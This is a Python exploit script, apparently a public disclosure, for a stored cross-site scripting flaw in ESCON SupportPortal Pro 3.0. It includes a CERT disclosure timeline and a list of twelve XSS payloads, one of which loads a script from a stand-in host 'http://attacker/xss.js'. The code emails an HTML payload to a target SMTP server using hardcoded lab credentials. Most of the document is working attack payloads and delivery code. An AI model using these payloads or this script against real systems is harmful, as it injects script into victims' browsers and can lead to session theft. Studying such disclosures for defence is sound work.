#!/usr/bin/python

'''

Author: loneferret of Offensive Security
Product: ESCON SupportPortal Pro
Version: 3.0
Vendor Site: http://www.e-supportportal.com
Software Download: http://www.e-supportportal.com/download.html


Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
23 Jul 2012: Update from CERT: No response from vendor
08 Aug 2012: Public Disclosure


Installed On: Ubuntu 11.10 LAMP
Client Test OS: Window 7 Pro SP1 (x86)
Browser Used: Internet Explorer 9

Extra Note: HTML must be enabled in the configuration


Injection Point: Body
Injection Payload(s):
1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
2: <SCRIPT>alert('XSS')</SCRIPT>
3: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
4: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
5: <HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
6: <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
7: <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
8: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
9: <SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
10: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
11: <<SCRIPT>alert("XSS");//<</SCRIPT>
12: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>

'''

import smtplib, urllib2

payload = """<SCRIPT>alert('XSS')</SCRIPT>"""

def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS" + payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()

username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"

print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)